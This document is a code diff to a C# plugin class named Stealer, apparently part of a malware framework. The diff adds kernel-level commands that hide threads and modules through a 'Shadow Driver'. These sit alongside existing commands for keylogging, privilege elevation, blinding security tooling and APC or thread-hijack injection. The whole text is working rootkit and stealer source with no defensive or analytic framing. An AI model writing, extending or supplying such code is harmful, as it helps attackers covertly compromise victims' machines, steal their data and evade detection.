@@ -125,7 +125,8 @@ public sealed class Stealer : IUniversalPlugin
   {
     get => new string[] { 
         "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind",
-        "kernel_hide_port", "kernel_clean_callbacks", "kernel_ghost_reg", "kernel_inject_apc", "kernel_inject_hijack"
+        "kernel_hide_port", "kernel_clean_callbacks", "kernel_ghost_reg", "kernel_inject_apc", "kernel_inject_hijack",
+        "kernel_hide_thread", "kernel_hide_module"
     };
   }
 
@@ -286,6 +287,44 @@ public sealed class Stealer : IUniversalPlugin
                 output = success ? $"Thread Hijack executed on PID {inj[0]}." : "Failed thread hijacking.";
               }
               else { output = "Invalid parameters. Use: pid|path"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_hide_thread":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Parameters: tid
+              int tid = parameters != null ? Convert.ToInt32(parameters) : 0;
+              if (tid > 0)
+              {
+                var target = new KernelController.TargetThread { Tid = (IntPtr)tid, Enable = true };
+                success = dev.SendIoctl(KernelController.HIDE_UNHIDE_THREAD, ref target);
+                output = success ? $"Thread {tid} hidden silently." : "Failed to hide thread.";
+              }
+              else { output = "Invalid TID."; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_hide_module":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Parameters: pid|moduleName
+              string[] m = (parameters as string)?.Split('|');
+              if (m?.Length >= 2)
+              {
+                var target = new KernelController.TargetModule { Pid = (IntPtr)int.Parse(m[0]), Name = m[1] };
+                success = dev.SendIoctl(KernelController.HIDE_MODULE, ref target);
+                output = success ? $"Module {m[1]} ghosted in PID {m[0]}." : "Failed to ghost module.";
+              }
+              else { output = "Invalid parameters. Use: pid|moduleName"; success = false; }
             }
             else { output = "Failed to connect to Shadow Driver."; success = false; }
           }
